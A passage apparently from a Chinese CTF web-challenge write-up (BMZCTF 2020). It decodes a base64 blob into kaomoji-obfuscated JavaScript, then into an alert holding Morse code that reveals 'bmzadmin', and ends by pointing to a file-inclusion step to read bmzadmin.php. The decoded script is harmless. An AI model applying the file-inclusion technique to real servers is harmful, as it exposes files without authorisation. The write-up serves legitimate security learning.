6f772w776fKSArICjvvp&#x2F;OmO++nykpKyAo776f772w776fKSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKO++n86Y776fKSsgKO++n++9sO++nykrICgo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAo776f0JTvvp8pW+++n861776fXSso776fzpjvvp8pKyAoKG9eX15vKSArKG9eX15vKSkrICgob15fXm8pIC0gKO++n86Y776fKSkrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKyjvvp&#x2F;OmO++nykrICgob15fXm8pICsob15fXm8pKSsgKO++n++9sO++nykrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKygo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAoY15fXm8pKyAo776f0JTvvp8pW+++n861776fXSso776f772w776fKSsgKChvXl9ebykgLSAo776fzpjvvp8pKSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKO++n86Y776fKSsgKGNeX15vKSsgKG9eX15vKSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKO++n86Y776fKSsgKCjvvp&#x2F;vvbDvvp8pICsgKO++n86Y776fKSkrIChjXl9ebykrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKyjvvp&#x2F;OmO++nykrICjvvp&#x2F;vvbDvvp8pKyAo776fzpjvvp8pKyAo776f0JTvvp8pW+++n861776fXSso776fzpjvvp8pKyAoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKO++n++9sO++nykrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKyjvvp&#x2F;OmO++nykrICgo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAo776f772w776fKSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKO++n86Y776fKSsgKO++n++9sO++nykrICgo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAo776f0JTvvp8pW+++n861776fXSso776fzpjvvp8pKyAoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKChvXl9ebykgKyhvXl9ebykpKyAo776f0JTvvp8pW+++n861776fXSso776fzpjvvp8pKyAo776f772w776fKSsgKCjvvp&#x2F;vvbDvvp8pICsgKG9eX15vKSkrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKyjvvp&#x2F;OmO++nykrICjvvp&#x2F;vvbDvvp8pKyAoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKO++n86Y776fKSsgKChvXl9ebykgKyhvXl9ebykpKyAoKG9eX15vKSAtICjvvp&#x2F;OmO++nykpKyAo776f0JTvvp8pW+++n861776fXSsoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKO++n++9sO++nykrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKyjvvp&#x2F;vvbDvvp8pKyAoY15fXm8pKyAo776f0JTvvp8pW+++n861776fXSso776fzpjvvp8pKyAoKG9eX15vKSArKG9eX15vKSkrICjvvp&#x2F;vvbDvvp8pKyAo776f0JTvvp8pW+++n861776fXSso776fzpjvvp8pKyAoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKGNeX15vKSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKO++n86Y776fKSsgKO++n++9sO++nykrICgo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAo776f0JTvvp8pW+++n861776fXSso776f772w776fKSsgKGNeX15vKSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKO++n86Y776fKSsgKO++n++9sO++nykrICgob15fXm8pIC0gKO++n86Y776fKSkrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKyjvvp&#x2F;OmO++nykrICjvvp&#x2F;vvbDvvp8pKyAo776fzpjvvp8pKyAo776f0JTvvp8pW+++n861776fXSso776fzpjvvp8pKyAo776f772w776fKSsgKG9eX15vKSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKO++n86Y776fKSsgKCjvvp&#x2F;vvbDvvp8pICsgKO++n86Y776fKSkrIChvXl9ebykrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKyjvvp&#x2F;OmO++nykrICjvvp&#x2F;vvbDvvp8pKyAoKO++n++9sO++nykgKyAob15fXm8pKSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKO++n86Y776fKSsgKChvXl9ebykgKyhvXl9ebykpKyAoKG9eX15vKSAtICjvvp&#x2F;OmO++nykpKyAo776f0JTvvp8pW+++n861776fXSso776fzpjvvp8pKyAoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKCjvvp&#x2F;vvbDvvp8pICsgKG9eX15vKSkrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKyjvvp&#x2F;OmO++nykrICgob15fXm8pICsob15fXm8pKSsgKCjvvp&#x2F;vvbDvvp8pICsgKO++n86Y776fKSkrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKyjvvp&#x2F;OmO++nykrICgo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAoKG9eX15vKSArKG9eX15vKSkrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKyjvvp&#x2F;OmO++nykrICjvvp&#x2F;vvbDvvp8pKyAo776f772w776fKSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKO++n++9sO++nykrIChjXl9ebykrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKyjvvp&#x2F;OmO++nykrICgo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAoKO++n++9sO++nykgKyAob15fXm8pKSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKO++n86Y776fKSsgKO++n++9sO++nykrICgob15fXm8pICsob15fXm8pKSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKO++n++9sO++nykrIChjXl9ebykrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKyjvvp&#x2F;OmO++nykrICgob15fXm8pICsob15fXm8pKSsgKO++n++9sO++nykrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKyjvvp&#x2F;OmO++nykrICgo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAoY15fXm8pKyAo776f0JTvvp8pW+++n861776fXSso776fzpjvvp8pKyAo776f772w776fKSsgKCjvvp&#x2F;vvbDvvp8pICsgKO++n86Y776fKSkrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKyjvvp&#x2F;vvbDvvp8pKyAoY15fXm8pKyAo776f0JTvvp8pW+++n861776fXSso776fzpjvvp8pKyAoKG9eX15vKSArKG9eX15vKSkrICgo776f772w776fKSArIChvXl9ebykpKyAo776f0JTvvp8pW+++n861776fXSso776fzpjvvp8pKyAo776f772w776fKSsgKCjvvp&#x2F;vvbDvvp8pICsgKO++n86Y776fKSkrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKyjvvp&#x2F;OmO++nykrICjvvp&#x2F;vvbDvvp8pKyAoKG9eX15vKSAtICjvvp&#x2F;OmO++nykpKyAo776f0JTvvp8pW+++n861776fXSso776fzpjvvp8pKyAoKG9eX15vKSArKG9eX15vKSkrIChvXl9ebykrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKyjvvp&#x2F;OmO++nykrICgo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAo776fzpjvvp8pKyAo776f0JTvvp8pW+++n861776fXSso776fzpjvvp8pKyAoKG9eX15vKSArKG9eX15vKSkrICjvvp&#x2F;vvbDvvp8pKyAo776f0JTvvp8pW+++n861776fXSso776fzpjvvp8pKyAo776f772w776fKSsgKCjvvp&#x2F;vvbDvvp8pICsgKO++n86Y776fKSkrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKyjvvp&#x2F;vvbDvvp8pKyAoY15fXm8pKyAo776f0JTvvp8pW+++n861776fXSso776fzpjvvp8pKyAoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKO++n86Y776fKSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKO++n86Y776fKSsgKChvXl9ebykgKyhvXl9ebykpKyAob15fXm8pKyAo776f0JTvvp8pW+++n861776fXSso776f772w776fKSsgKGNeX15vKSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKCjvvp&#x2F;vvbDvvp8pICsgKO++n86Y776fKSkrICgo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAo776f0JTvvp8pW+++n861776fXSsoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKChvXl9ebykgKyhvXl9ebykpKyAo776f0JTvvp8pW+++n861776fXSsoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKChvXl9ebykgKyhvXl9ebykpKyAo776f0JTvvp8pW+++n861776fXSsoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKChvXl9ebykgKyhvXl9ebykpKyAo776f0JTvvp8pW+++n861776fXSsoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKCjvvp&#x2F;vvbDvvp8pICsgKG9eX15vKSkrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKygo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKCjvvp&#x2F;vvbDvvp8pICsgKO++n86Y776fKSkrICgo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAo776f0JTvvp8pW+++n861776fXSsoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKCjvvp&#x2F;vvbDvvp8pICsgKG9eX15vKSkrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKygo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKCjvvp&#x2F;vvbDvvp8pICsgKO++n86Y776fKSkrICgo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAo776f0JTvvp8pW+++n861776fXSsoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKChvXl9ebykgKyhvXl9ebykpKyAo776f0JTvvp8pW+++n861776fXSsoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKChvXl9ebykgKyhvXl9ebykpKyAo776f0JTvvp8pW+++n861776fXSsoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKCjvvp&#x2F;vvbDvvp8pICsgKG9eX15vKSkrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKygo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAoKG9eX15vKSArKG9eX15vKSkrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKygo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKCjvvp&#x2F;vvbDvvp8pICsgKO++n86Y776fKSkrICgo776f772w776fKSArIChvXl9ebykpKyAo776f0JTvvp8pW+++n861776fXSsoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKCjvvp&#x2F;vvbDvvp8pICsgKO++n86Y776fKSkrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKygo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAoKG9eX15vKSArKG9eX15vKSkrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKygo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAoKG9eX15vKSArKG9eX15vKSkrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKygo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAoKO++n++9sO++nykgKyAob15fXm8pKSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKCjvvp&#x2F;vvbDvvp8pICsgKO++n86Y776fKSkrICgo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAo776f0JTvvp8pW+++n861776fXSsoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKCjvvp&#x2F;vvbDvvp8pICsgKO++n86Y776fKSkrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKygo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAoKO++n++9sO++nykgKyAob15fXm8pKSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKCjvvp&#x2F;vvbDvvp8pICsgKO++n86Y776fKSkrICgob15fXm8pICsob15fXm8pKSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKCjvvp&#x2F;vvbDvvp8pICsgKO++n86Y776fKSkrICgob15fXm8pICsob15fXm8pKSsgKO++n9CU776fKVvvvp&#x2F;Ote++n10rKCjvvp&#x2F;vvbDvvp8pICsgKO++n86Y776fKSkrICgo776f772w776fKSArIChvXl9ebykpKyAo776f0JTvvp8pW+++n861776fXSsoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKCjvvp&#x2F;vvbDvvp8pICsgKO++n86Y776fKSkrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKygo776f772w776fKSArICjvvp&#x2F;OmO++nykpKyAoKG9eX15vKSArKG9eX15vKSkrICjvvp&#x2F;QlO++nylb776fzrXvvp9dKyjvvp&#x2F;vvbDvvp8pKyAoKG9eX15vKSAtICjvvp&#x2F;OmO++nykpKyAo776f0JTvvp8pW+++n861776fXSsoKO++n++9sO++nykgKyAo776fzpjvvp8pKSsgKO++n86Y776fKSsgKO++n9CU776fKVvvvp9v776fXSkgKO++n86Y776fKSkgKCdfJyk7</span><br></pre></td></tr></table></figure>
+
+<p>看起来很是base系列编码，但是没看到=，就觉得不是base64，在这纠结了好久，最终也没发现别的什么编码或者加密之后长这样，看了<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/01/05/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/2020%20%E7%AC%AC%E4%B8%80%E5%B1%8ABMZCTF%E5%85%AC%E5%BC%80%E8%B5%9B-WEB-Writeup/">wp</a>发现，真就是base64。。。</p>
+<p>解码得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">ﾟωﾟﾉ&#x3D; &#x2F;｀ｍ´）ﾉ ~┻━┻   &#x2F;&#x2F;*´∇｀*&#x2F; [&#39;_&#39;]; o&#x3D;(ﾟｰﾟ)  &#x3D;_&#x3D;3; c&#x3D;(ﾟΘﾟ) &#x3D;(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) &#x3D;(ﾟΘﾟ)&#x3D; (o^_^o)&#x2F; (o^_^o);(ﾟДﾟ)&#x3D;&#123;ﾟΘﾟ: &#39;_&#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#39;_&#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] &#x3D;((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [c^_^o];(ﾟДﾟ) [&#39;c&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#39;o&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ﾟΘﾟ];(ﾟoﾟ)&#x3D;(ﾟДﾟ) [&#39;c&#39;]+(ﾟДﾟ) [&#39;o&#39;]+(ﾟωﾟﾉ +&#39;_&#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#39;c&#39;]+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#39;o&#39;]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ];(ﾟДﾟ) [&#39;_&#39;] &#x3D;(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)&#x3D;((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#39;_&#39;) [ﾟΘﾟ]; (ﾟｰﾟ)+&#x3D;(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]&#x3D;&#39;\\&#39;; (ﾟДﾟ).ﾟΘﾟﾉ&#x3D;(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)&#x3D;(ﾟωﾟﾉ +&#39;_&#39;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]&#x3D;&#39;\&quot;&#39;;(ﾟДﾟ) [&#39;_&#39;] ( (ﾟДﾟ) [&#39;_&#39;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#39;_&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>颜文字解密得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(&quot;Challenger, the background of the website is -...&#x2F;--&#x2F;--..&#x2F;.-&#x2F;-..&#x2F;--&#x2F;..&#x2F;-.&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>摩斯密码解密得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bmzadmin</span><br></pre></td></tr></table></figure>
+
+<p>使用文件包含查看<code>bmzadmin.php</code></p>
